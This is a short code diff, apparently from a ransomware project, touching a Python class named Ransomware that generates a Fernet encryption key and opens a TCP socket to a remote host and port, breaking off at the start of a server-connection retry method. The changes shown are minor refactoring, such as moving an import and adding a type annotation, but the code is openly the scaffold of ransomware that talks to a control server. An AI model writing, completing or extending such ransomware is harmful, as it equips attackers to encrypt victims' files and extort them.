@@ -1,18 +1,20 @@
 
 from time import sleep
+from modules.system import System
 from cryptography.fernet import Fernet
-from ..modules.system import System
 from socket import socket, AF_INET, SOCK_STREAM
 
 
 
 class Ransomware:
+
     def __init__(self, host: str, port: int) -> None:
         self.host = host
         self.port = port
-        self.server = socket(AF_INET, SOCK_STREAM)
+        self.server: socket = socket(AF_INET, SOCK_STREAM)
         self.key = Fernet.generate_key()
         self.Private = Fernet(self.key)
+
 
     def ConnectServer(self, connected = False) -> None:
         retries = 0
